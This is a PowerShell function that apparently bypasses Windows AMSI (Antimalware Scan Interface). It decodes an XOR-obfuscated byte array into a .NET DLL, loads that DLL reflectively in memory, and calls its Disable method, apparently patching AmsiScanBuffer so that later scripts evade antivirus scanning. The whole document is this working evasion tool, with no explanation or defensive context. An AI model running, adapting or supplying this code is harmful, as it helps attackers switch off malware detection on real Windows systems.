function AMSBP
{
	if (-not ([System.Management.Automation.PSTypeName]"BP.AMS").Type) {
		$byteArray = @(121,12,210,23,62,52,86,66,19,61,52,86,189,232,61,52,238,66,23,61,52,86,66,23,125,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,180,86,66,23,51,43,236,76,23,137,61,155,99,175,60,120,155,99,67,85,93,37,98,103,79,91,49,48,118,80,20,53,35,121,83,91,34,98,117,88,20,36,55,121,29,93,56,98,83,114,103,118,47,120,89,81,120,79,26,55,16,86,66,23,61,52,86,66,71,120,52,86,14,22,62,52,223,244,211,96,52,86,66,23,61,52,86,66,247,61,54,119,73,22,54,52,86,74,23,61,52,80,66,23,61,52,86,66,217,27,52,86,66,55,61,52,86,2,23,61,52,86,66,7,61,20,86,66,23,63,52,86,70,23,61,52,86,66,23,61,48,86,66,23,61,52,86,66,23,189,52,86,66,21,61,52,86,66,23,61,55,86,2,146,61,52,70,66,23,45,52,86,66,23,45,52,86,82,23,61,52,86,66,23,45,52,86,66,23,61,52,86,66,23,61,52,214,100,23,61,127,86,66,23,61,116,86,66,167,63,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,93,52,86,78,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,20,86,66,31,61,52,86,66,23,61,52,86,66,23,61,60,118,66,23,117,52,86,66,23,61,52,86,66,23,61,52,120,54,114,69,64,86,66,23,233,50,86,66,23,29,52,86,66,31,61,52,86,64,23,61,52,86,66,23,61,52,86,66,23,61,52,86,98,23,61,84,120,48,100,79,87,86,66,23,141,54,86,66,23,125,52,86,66,19,61,52,86,72,23,61,52,86,66,23,61,52,86,66,23,61,52,86,2,23,61,116,120,48,114,81,91,53,66,23,49,52,86,66,23,93,52,86,66,21,61,52,86,76,23,61,52,86,66,23,61,52,86,66,23,61,52,86,2,23,61,118,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,242,49,61,52,86,66,23,61,124,86,66,23,63,52,83,66,87,28,52,86,2,18,61,52,87,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,81,39,57,52,138,66,23,61,53,86,66,6,79,53,86,66,103,21,54,86,66,17,55,50,36,81,23,61,68,126,67,23,61,50,93,89,63,56,52,86,72,27,43,57,81,74,8,125,38,85,106,20,61,52,80,100,0,176,51,86,66,22,46,62,71,72,1,34,5,202,83,29,46,48,65,207,16,61,52,87,81,28,44,63,64,98,232,61,52,86,222,6,54,39,83,85,154,58,52,86,67,4,49,37,90,84,55,173,52,86,66,139,44,56,69,68,0,21,50,86,66,29,46,51,71,70,1,44,51,65,106,16,61,52,92,69,8,38,28,94,66,23,55,37,81,85,63,57,52,86,68,0,21,50,86,66,29,46,60,71,71,1,44,60,65,106,16,61,52,92,69,8,33,28,94,66,23,55,37,94,85,63,57,52,86,68,0,21,50,86,66,29,46,61,71,68,1,44,61,65,106,16,61,52,92,69,8,32,28,94,66,23,55,37,95,85,63,57,52,86,68,101,12,52,86,50,63,52,52,86,72,61,35,54,126,72,23,61,62,124,0,68,119,118,87,66,22,61,52,86,66,23,49,52,86,66,97,9,26,102,108,36,13,7,103,123,23,61,52,86,71,23,81,52,86,66,195,60,52,86,97,105,61,52,22,64,23,61,196,87,66,23,30,103,34,48,126,83,83,37,66,23,61,52,102,70,23,61,88,86,66,23,30,97,5,66,139,57,52,86,82,23,61,52,117,5,66,116,112,86,66,23,145,48,86,66,131,61,52,86,97,85,81,91,52,66,23,61,52,86,66,23,63,52,86,67,80,40,54,66,75,23,61,52,86,184,50,14,52,64,66,23,60,52,86,66,29,61,52,86,64,23,61,52,80,66,23,61,62,86,66,23,55,52,86,66,21,61,52,86,67,23,61,52,84,66,23,61,48,86,66,23,60,52,86,66,22,61,52,86,66,23,55,52,87,66,23,61,52,86,68,23,13,52,127,66,17,61,232,86,255,23,59,52,65,67,224,61,50,86,117,22,202,52,80,66,119,60,137,86,68,23,170,53,127,66,17,61,159,87,107,23,59,52,230,67,170,61,50,86,136,22,20,52,80,66,202,60,29,86,66,23,61,52,87,66,23,61,52,86,67,23,60,52,87,66,7,61,45,86,95,23,56,52,87,66,22,61,52,86,66,23,189,52,192,98,32,61,62,86,67,23,61,52,86,66,151,61,162,118,4,23,45,52,85,66,23,61,52,86,194,23,171,20,4,66,2,61,48,86,66,23,61,52,214,66,134,29,85,86,92,23,53,52,6,98,23,61,52,86,212,23,81,52,115,66,28,61,12,119,66,23,61,52,208,90,99,61,29,86,73,23,61,52,87,66,109,61,52,86,64,23,191,52,86,66,22,61,191,86,66,23,60,52,198,66,23,61,54,86,216,23,61,52,85,66,182,61,54,86,70,23,147,52,86,66,22,61,221,86,66,23,63,52,184,66,23,61,55,86,176,23,44,52,34,66,62,61,45,86,54,23,16,52,119,66,99,61,29,86,107,23,73,52,100,66,38,61,171,87,117,23,124,52,238,67,43,61,117,86,135,22,124,52,31,66,198,60,126,86,19,23,216,53,6,66,30,61,64,86,107,23,19,52,69,66,124,61,26,86,89,23,73,52,3,66,100,60,72,87,66,22,62,52,97,66,22,61,52,87,71,23,123,52,87,66,23,60,51,86,16,23,60,52,86,67,30,61,189,87,64,23,57,180,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,23,22,61,52,82,66,23,61,52,86,66,23,61,52,86,66,22,61,20,86,66,23,61,52,86,66,23,1,121,57,38,98,81,81,104,66,68,82,65,36,33,114,83,81,33,112,57,89,88,58,66,86,112,103,86,0,71,61,89,37,33,120,79,88,63,32,23,110,77,37,54,114,80,52,25,32,125,88,87,34,66,80,88,64,6,48,120,94,117,50,38,101,88,71,37,66,91,82,85,50,14,126,95,70,55,48,110,61,98,63,48,99,72,85,58,18,101,82,64,51,33,99,61,121,57,52,114,112,81,59,45,101,68,52,18,43,100,92,86,58,39,23,19,87,34,45,101,61,92,27,45,115,72,88,51,66,103,79,91,53,12,118,80,81,86,44,118,80,81,86,46,103,124,80,50,48,114,78,71,86,38,96,110,93,44,39,23,91,88,24,39,96,109,70,57,54,114,94,64,86,46,103,91,88,25,46,115,109,70,57,54,114,94,64,86,17,110,78,64,51,47,57,111,65,56,54,126,80,81,120,11,121,73,81,36,45,103,110,81,36,52,126,94,81,37,66,88,72,64,23,54,99,79,93,52,55,99,88,52,50,39,100,73,52,37,48,116,61,71,63,56,114,61,103,47,49,99,88,89,120,16,98,83,64,63,47,114,19,119,57,47,103,84,88,51,48,68,88,70,32,43,116,88,71,86,1,120,80,68,63,46,118,73,93,57,44,69,88,88,55,58,118,73,93,57,44,100,124,64,34,48,126,95,65,34,39,23,111,65,56,54,126,80,81,21,45,122,77,85,34,43,117,84,88,63,54,110,124,64,34,48,126,95,65,34,39,23,110,91,35,48,116,88,90,51,53,37,61,112,58,46,94,80,68,57,48,99,124,64,34,48,126,95,65,34,39,23,86,81,36,44,114,81,7,100,66,92,88,70,56,39,123,14,6,120,38,123,81,52,4,54,123,112,91,32,39,90,88,89,57,48,110,61,97,31,44,99,109,64,36,66,120,77,107,19,58,103,81,93,53,43,99,61,118,47,54,114,61,121,55,48,100,85,85,58,66,86,81,88,57,33,95,122,88,57,32,118,81,52,21,45,103,68,52,31,44,99,109,64,36,66,120,77,107,23,38,115,84,64,63,45,121,61,119,57,44,100,82,88,51,66,64,79,93,34,39,91,84,90,51,66,23,61,37,55,66,122,61,71,86,43,23,19,52,50,66,123,61,88,86,66,10,124,52,59,66,100,61,93,86,17,23,94,52,55,66,121,61,118,86,55,23,91,52,48,66,114,61,70,86,66,32,112,52,51,66,122,61,91,86,48,23,68,52,118,66,103,61,85,86,54,23,94,52,62,66,114,61,80,86,98,23,78,52,35,66,116,61,87,86,39,23,78,52,37,66,113,61,65,86,46,23,68,52,120,66,23,61,52,86,197,238,135,238,177,225,85,119,135,0,136,119,191,70,188,86,23,53,131,44,30,65,36,0,182,203,18,61,54,78,90,25,57,52,87,90,25,53,52,82,64,15,36,61,70,75,17,61,55,87,90,15,53,55,86,66,22,62,20,86,67,19,29,53,87,74,19,29,53,87,76,19,61,53,79,75,19,61,53,78,74,31,61,48,87,95,18,53,44,94,71,23,63,44,78,74,19,61,53,87,76,2,58,57,78,90,14,52,41,83,95,18,32,49,78,90,15,32,49,75,71,10,56,60,87,66,31,61,52,86,66,23,35,53,86,67,23,105,54,64,21,101,92,68,24,45,121,120,76,53,39,103,73,93,57,44,67,85,70,57,53,100,60,52,254,100,23,61,52,86,66,23,61,52,86,66,169,27,52,86,66,55,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,230,100,23,61,52,86,66,23,61,52,9,1,120,79,112,58,46,90,92,93,56,66,122,78,87,57,48,114,88,26,50,46,123,61,52,86,66,23,194,17,86,98,23,45,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,60,52,70,66,23,61,44,86,66,151,61,52,86,66,23,61,52,86,66,23,61,52,86,66,22,61,53,86,66,23,13,52,86,194,23,61,52,86,66,23,61,52,86,66,23,61,52,86,67,23,61,52,86,66,95,61,52,86,26,87,61,52,2,64,23,61,52,86,66,23,61,52,86,66,67,63,0,86,66,23,107,52,5,66,72,61,98,86,7,23,111,52,5,66,94,61,123,86,12,23,98,52,31,66,89,61,114,86,13,23,61,52,86,66,170,57,219,168,66,23,60,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,125,23,61,52,86,66,23,61,48,86,66,23,63,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,112,86,66,23,60,52,0,66,118,61,70,86,4,23,84,52,58,66,114,61,125,86,44,23,91,52,57,66,23,61,52,86,102,23,57,52,86,66,67,61,70,86,35,23,83,52,37,66,123,61,85,86,54,23,84,52,57,66,121,61,52,86,66,23,61,52,230,70,163,60,52,86,67,23,110,52,34,66,101,61,93,86,44,23,90,52,16,66,126,61,88,86,39,23,116,52,56,66,113,61,91,86,66,23,173,53,86,66,22,61,4,86,114,23,13,52,102,66,39,61,0,86,32,23,13,52,86,66,59,61,54,86,67,23,123,52,63,66,123,61,81,86,6,23,88,52,37,66,116,61,70,86,43,23,77,52,34,66,126,61,91,86,44,23,61,52,86,66,55,61,52,86,114,23,53,52,87,66,81,61,93,86,46,23,88,52,0,66,114,61,70,86,49,23,84,52,57,66,121,61,52,86,66,23,13,52,120,66,39,61,26,86,114,23,19,52,102,66,23,61,116,86,77,23,60,52,31,66,121,61,64,86,39,23,79,52,56,66,118,61,88,86,12,23,92,52,59,66,114,61,52,86,17,23,82,52,35,66,101,61,87,86,39,23,83,52,51,66,96,61,6,86,108,23,89,52,58,66,123,61,52,86,66,23,21,52,84,66,22,61,120,86,39,23,90,52,55,66,123,61,119,86,45,23,77,52,47,66,101,61,93,86,37,23,85,52,34,66,23,61,20,86,66,23,117,52,89,66,22,61,123,86,48,23,84,52,49,66,126,61,90,86,35,23,81,52,16,66,126,61,88,86,39,23,83,52,55,66,122,61,81,86,66,23,110,52,57,66,98,61,70,86,33,23,88,52,56,66,114,61,67,86,112,23,19,52,50,66,123,61,88,86,66,23,61,52,98,66,31,61,53,86,18,23,79,52,57,66,115,61,65,86,33,23,73,52,0,66,114,61,70,86,49,23,84,52,57,66,121,61,52,86,114,23,19,52,102,66,57,61,4,86,108,23,13,52,86,66,47,61,60,86,67,23,124,52,37,66,100,61,81,86,47,23,95,52,58,66,110,61,20,86,20,23,88,52,36,66,100,61,93,86,45,23,83,52,86,66,39,61,26,86,114,23,19,52,102,66,57,61,4,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,20,86,66,27,61,52,86,146,33,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52,86,66,23,61,52)
		$KeyArray = @(52, 86, 66, 23, 61)
		$keyposition = 0
		for ($i = 0; $i -lt $byteArray.count; $i++)
		{
			$byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]
			$keyposition += 1
			if ($keyposition -eq $keyArray.Length) { $keyposition = 0 }
		}
		[Reflection.Assembly]::Load([byte[]]$byteArray) | Out-Null
		Write-Output "DLL has been reflected"
	}
	[BP.AMS]::Disable()
}
